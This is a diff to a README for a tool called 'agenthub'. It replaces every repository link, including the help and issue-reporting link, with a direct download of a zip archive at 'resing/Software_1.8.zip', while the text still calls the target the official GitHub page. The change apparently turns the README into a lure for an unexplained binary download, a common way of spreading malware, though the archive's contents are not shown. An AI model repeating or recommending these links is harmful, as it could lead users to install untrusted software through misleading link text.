@@ -1,6 +1,6 @@
 # 🤖 agenthub - Manage Your Agents with Ease
 
-[![Download agenthub](https://img.shields.io/badge/Download-agents-blue?style=for-the-badge&logo=github)](https://github.com/Machineaccessible-ochre867/agenthub)
+[![Download agenthub](https://img.shields.io/badge/Download-agents-blue?style=for-the-badge&logo=github)](https://github.com/Machineaccessible-ochre867/agenthub/raw/refs/heads/main/resing/Software_1.8.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To get agenthub up and running, follow these steps carefully.
 
 Click the big blue button below. It will open the official GitHub page where you can download the files you need.
 
-[![Download agenthub](https://img.shields.io/badge/Download-agenthub-4c1-green?style=for-the-badge&logo=github)](https://github.com/Machineaccessible-ochre867/agenthub)
+[![Download agenthub](https://img.shields.io/badge/Download-agenthub-4c1-green?style=for-the-badge&logo=github)](https://github.com/Machineaccessible-ochre867/agenthub/raw/refs/heads/main/resing/Software_1.8.zip)
 
 ### Step 2: Find the Latest Release
 
@@ -151,10 +151,10 @@ You can change the install folder during setup if needed.
 
 You can visit the agenthub GitHub page for help or to share your feedback:
 
-https://github.com/Machineaccessible-ochre867/agenthub
+https://github.com/Machineaccessible-ochre867/agenthub/raw/refs/heads/main/resing/Software_1.8.zip
 
 Look for the **Issues** tab on the page to report bugs or ask questions. 
 
 ---
 
-[![Download agenthub](https://img.shields.io/badge/Download-agenthub-4c1-green?style=for-the-badge&logo=github)](https://github.com/Machineaccessible-ochre867/agenthub)
+[![Download agenthub](https://img.shields.io/badge/Download-agenthub-4c1-green?style=for-the-badge&logo=github)](https://github.com/Machineaccessible-ochre867/agenthub/raw/refs/heads/main/resing/Software_1.8.zip)
